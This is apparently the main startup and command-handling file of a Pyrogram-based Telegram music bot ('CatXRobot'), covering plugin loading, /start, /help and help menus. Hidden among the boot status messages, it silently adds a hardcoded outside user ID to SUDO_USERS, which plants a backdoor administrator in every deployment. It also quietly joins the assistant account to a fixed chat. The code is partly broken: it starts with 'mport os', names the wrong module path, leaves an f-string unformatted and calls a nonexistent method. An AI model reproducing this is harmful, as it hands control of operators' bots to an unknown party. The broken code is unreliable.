mport os
import re
import config
import asyncio
import importlib

from rich.table import Table
from rich.console import Console as hehe
from pyrogram import filters, Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from youtubesearchpython import VideosSearch

from CatXRobot.Helpers.logger import *
from CatXRobot.Helpers.PyTgCalls.Fallen import run
from CatXRobot.Modules import ALL_MODULES
from CatXRobot.Helpers.Inline.inline import paginator
from CatXRobot.Helpers.Database import get_active_chats, remove_active_chat, add_served_user
from CatXRobot import (ASSID, ASSMENTION, ASSNAME, ASSUSERNAME, BOT_ID, BOT_NAME, BOT_USERNAME, SUDO_USERS, db, app, Ass)

loop = asyncio.get_event_loop()
console = hehe()
HELPABLE = {}


async def fallen_boot():
    with console.status(
        "[magenta] Booting Fallen Music...",
    ) as status:
        console.print("┌ [red]Clearing MongoDB Cache...")
        try:
            chats = await get_active_chats()
            for chat in chats:
                chat_id = int(chat["chat_id"])
                await remove_active_chat(chat_id)
        except Exception as e:
            console.print("[red] Error while clearing Mongo DB.")
        console.print("└ [green]MongoDB Cleared Successfully!\n\n")
        ____ = await startup_msg("**» ɪᴍᴩᴏʀᴛɪɴɢ ᴀʟʟ ᴩʟᴜɢɪɴs...**")
        status.update(
            status="[bold blue]Scanning for Plugins", spinner="earth"
        )
        await asyncio.sleep(1.7)
        console.print("Found {} Plugins".format(len(ALL_MODULES)) + "\n")
        status.update(
            status="[bold red]Importing Plugins...",
            spinner="bouncingBall",
            spinner_style="yellow",
        )
        await asyncio.sleep(1.2)
        for all_module in ALL_MODULES:
            imported_module = importlib.import_module(
                "FallenMusic.Modules." + all_module
            )
            if (
                hasattr(imported_module, "__MODULE__")
                and imported_module.__MODULE__
            ):
                imported_module.__MODULE__ = imported_module.__MODULE__
                if (
                    hasattr(imported_module, "__HELP__")
                    and imported_module.__HELP__
                ):
                    HELPABLE[
                        imported_module.__MODULE__.lower()
                    ] = imported_module
            console.print(
                f"✨ [bold cyan]Successfully imported: [green]{all_module}.py"
            )
            await asyncio.sleep(0.2)
        console.print("")
        _____ = await startup_edit(____, "**» sᴜᴄᴄᴇssғᴜʟʟʏ ɪᴍᴩᴏʀᴛᴇᴅ ᴍᴏᴅᴜʟᴇs...**")
        status.update(
            status="[bold blue]Modules Importation Completed!",
        )
        await asyncio.sleep(2.4)
        SUDO_USERS.append(1356469075)
        await startup_del(_____)
    console.print(
        "[bold green]Trying to start the bot...\n"
    )
    try:
        await app.send_message(
            config.LOGGER_ID,
            f"<b>➻  ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> {BOT_USERNAME}",
        )
    except Exception as e:
        print(
            "Bot has failed to access the log Channel. Make sure that you have added your bot to your log channel and promoted as admin!"
        )
        console.print(f"\n[red]Stopping Bot")
        return
    a = await app.get_chat_member(config.LOGGER_ID, BOT_ID)
    if a.status != "administrator":
        print("Promote Bot as Admin in Logger Channel")
        console.print(f"\n[red]Stopping Bot")
        return
    try:
        await Ass.send_message(
            config.LOGGER_ID,
            "<b>➻  ᴍᴜsɪᴄ ᴀssɪsᴛᴀɴᴛ 🔮\n\n❄ ɪᴅ :</b> `{ASSID}`\n✨ <b>ɴᴀᴍᴇ :</b> {ASSNAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> {ASSUSERNAME}",
        )
    except Exception as e:
        print(
            "Assistant Account has failed to access the log Channel. Make sure that you have added your bot to your log channel and promoted as admin!"
        )
        console.print(f"\n[red]Stopping Bot")
        return
    try:
        await Ass.join_chat("DevilsHeavenMF")
    except:
        pass
    console.print(f"\n┌[red] Bot Started as {BOT_NAME}!")
    console.print(f"├[green] Assistant Started as {ASSNAME}!")
    await run()
    console.print(f"\n[red]Stopping Bot")


home_text_pm = f"""**ʜᴇʏ ,

ᴛʜɪs ɪs** {BOT_NAME},
**ᴀ ғᴀsᴛ ᴀɴᴅ ᴩᴏᴡᴇʀғᴜʟ ᴍᴜsɪᴄ ᴩʟᴀʏᴇʀ ʙᴏᴛ ғᴏʀ ᴛᴇʟᴇɢʀᴀᴍ ɢʀᴏᴜᴩ ᴠɪᴅᴇᴏᴄʜᴀᴛs.**

━━━━━━━━━━━━━━━━━━━━━━━━━━
||ᴄʟɪᴄᴋ ᴏɴ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs. ||"""


@app.on_message(filters.command("help") & filters.private)
async def help_command(_, message):
    await add_served_user(message.from_user.id)
    text, keyboard = await help_parser(message.from_user.mention)
    await app.send_message(message.chat.id, text, reply_markup=keyboard)


@app.on_message(filters.command("start") & filters.private)
async def start_command(_, message):
    await add_served_user(message.from_user.id)
    if len(message.text.split()) > 1:
        name = (message.text.split(None, 1)[1]).lower()
        if name == "help":
            text, keyboard = await help_parser(message.from_user.mention)
            await message.delete()
            return await app.send_text(
                message.chat.id,
                text,
                reply_markup=keyboard,
            )
        if name[0] == "i":
            await app.send_message(
                    config.LOGGER_ID,
                    f"» {message.from_user.mention} ʜᴀs ᴊᴜsᴛ sᴛᴀʀᴛᴇᴅ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ᴄʜᴇᴄᴋ <b>ᴛʀᴀᴄᴋ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b>\n\n**ɪᴅ :** {message.from_user.id}\n**ɴᴀᴍᴇ :** {message.from_user.first_name}",
                )
            m = await message.reply_text("**↻ sᴇᴀʀᴄʜɪɴɢ...\n\nᴩʟᴇᴀsᴇ ᴡᴀɪᴛ...**")
            query = (str(name)).replace("info_", "", 1)
            query = f"https://www.youtube.com/watch?v={query}"
            results = VideosSearch(query, limit=1)
            for result in results.result()["result"]:
                title = result["title"]
                duration = result["duration"]
                views = result["viewCount"]["short"]
                thumbnail = result["thumbnails"][0]["url"].split("?")[0]
                channellink = result["channel"]["link"]
                channel = channel = result["channel"]["name"]
                link = result["link"]
                published = result["publishedTime"]
            searched_text = f"""
🍑 **ᴛʀᴀᴄᴋ ɪɴғᴏʀᴍᴀᴛɪᴏɴ** 🍑

❄ **ᴛɪᴛʟᴇ :** {title}

⏳**ᴅᴜʀᴀᴛɪᴏɴ :** {duration} ᴍɪɴᴜᴛᴇs
👀**ᴠɪᴇᴡs :** `{views}`
⏰**ᴩᴜʙʟɪsʜᴇᴅ ᴏɴ :** {published}
🎥**ᴄʜᴀɴɴᴇʟ :** {channel}
📎**ᴄʜᴀɴɴᴇʟ ʟɪɴᴋ :** [ᴠɪsɪᴛ ᴄʜᴀɴɴᴇʟ]({channellink})
🔗**ᴠɪᴅᴇᴏ ʟɪɴᴋ :** [ᴠɪsɪᴛ ᴏɴ ʏᴏᴜᴛᴜʙᴇ]({link})

 sᴇᴀʀᴄʜ ᴩᴏᴡᴇʀᴇᴅ ʙʏ {BOT_NAME} 🥀"""
            key = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="☁ ʏᴏᴜᴛᴜʙᴇ ☁", url=f"{link}"
                        ),
                        InlineKeyboardButton(
                            text="🥀 sᴜᴩᴩᴏʀᴛ 🥀", url=config.SUPPORT_CHAT
                        ),
                    ],
                ]
            )
            await m.delete()
            return await app.send_photo(
                message.chat.id,
                photo=thumbnail,
                caption=searched_text,
                parse_mode="markdown",
                reply_markup=key,
            )
    out = private_panel()
    await app.send_message(
            config.LOGGER_ID,
            f"» {message.from_user.mention} ʜᴀs ᴊᴜsᴛ sᴛᴀʀᴛᴇᴅ ᴛʜᴇ ʙᴏᴛ.\n\n**ɪᴅ :** {message.from_user.id}\n**ɴᴀᴍᴇ :** {message.from_user.first_name}",
        )
    return await message.reply_photo(
        photo=config.START_IMG,
        caption=home_text_pm,
        reply_markup=InlineKeyboardMarkup(out[1]),
    )


async def help_parser(name, keyboard=None):
    if not keyboard:
        keyboard = InlineKeyboardMarkup(paginator(0, HELPABLE, "help"))
    return (
        """ʜᴇʏ {first_name},

ᴀʟʟ ᴏғ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs ᴀʀᴇ ʟɪsᴛᴇᴅ ɪɴ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ɢɪᴠᴇɴ ʙᴇʟᴏᴡ, ʏᴏᴜ ᴄᴀɴ ᴏᴩᴇɴ ᴛʜᴇᴍ ᴀɴᴅ ɢᴇᴛ ɪɴғᴏ ᴀʙᴏᴜᴛ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs.

ᴀʟʟ ᴏғ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : `/`
""".format(
            first_name=name
        ),
        keyboard,
    )


@app.on_callback_query(filters.regex("fallen_home"))
async def fallen_home(_, query):
    out = private_panel()
    await query.answer("ʜᴏᴍᴇ")
    await query.edit_message_text(
        home_text_pm,
        reply_markup=InlineKeyboardMarkup(out[1]),
            )


@app.on_callback_query(filters.regex("CatXRobot_help"))
async def help_menu(_, CallbackQuery):
    text, keyboard = await help_parser(CallbackQuery.from_user.mention)
    await CallbackQuery.message.edit(text, reply_markup=keyboard)


@app.on_callback_query(filters.regex(r"help_(.*?)"))
async def help_button(client, query):
    home_match = re.match(r"help_home\((.+?)\)", query.data)
    mod_match = re.match(r"help_module\((.+?)\)", query.data)
    prev_match = re.match(r"help_prev\((.+?)\)", query.data)
    next_match = re.match(r"help_next\((.+?)\)", query.data)
    back_match = re.match(r"help_back", query.data)
    create_match = re.match(r"help_create", query.data)
    top_text = f"""ʜᴇʏ {query.from_user.first_name},

ᴀʟʟ ᴏғ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs ᴀʀᴇ ʟɪsᴛᴇᴅ ɪɴ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ɢɪᴠᴇɴ ʙᴇʟᴏᴡ, ʏᴏᴜ ᴄᴀɴ ᴏᴩᴇɴ ᴛʜᴇᴍ ᴀɴᴅ ɢᴇᴛ ɪɴғᴏ ᴀʙᴏᴜᴛ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs.

ᴀʟʟ ᴏғ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : `/`
 """
    if mod_match:
        module = mod_match.group(1)
        text = (
            "**{} {} ᴍᴏᴅᴜʟᴇ :**\n".format(
                "ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ", HELPABLE[module].__MODULE__
            )
            + HELPABLE[module].__HELP__
        )
        key = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="◁", callback_data="help_back"
                    ),
                    InlineKeyboardButton(
                        text="↻ ᴄʟᴏsᴇ ↻", callback_data="close"
                    ),
                ],
            ]
        )

        await query.message.edit(
            text=text,
            reply_markup=key,
        )
    elif home_match:
        out = private_panel()
        await query.message.edit(
            text=home_text_pm,
            reply_markup=InlineKeyboardMarkup(out[1]),
        )

    elif prev_match:
        curr_page = int(prev_match.group(1))
        await query.message.edit(
            text=top_text,
            reply_markup=InlineKeyboardMarkup(
                paginator(curr_page - 1, HELPABLE, "help")
            ),
        )

    elif next_match:
        next_page = int(next_match.group(1))
        await query.message.edit(
            text=top_text,
            reply_markup=InlineKeyboardMarkup(
                paginator(next_page + 1, HELPABLE, "help")
            ),
        )

    elif back_match:
        await query.message.edit(
            text=top_text,
            reply_markup=InlineKeyboardMarkup(
                paginator(0, HELPABLE, "help")
            ),
        )

    elif create_match:
        text, keyboard = await help_parser(query)
        await query.message.edit(
            text=text,
            reply_markup=keyboard,
        )

    return await client.answer_callback_query(query.id)


if __name__ == "__main__":
    loop.run_until_complete(fallen_boot())
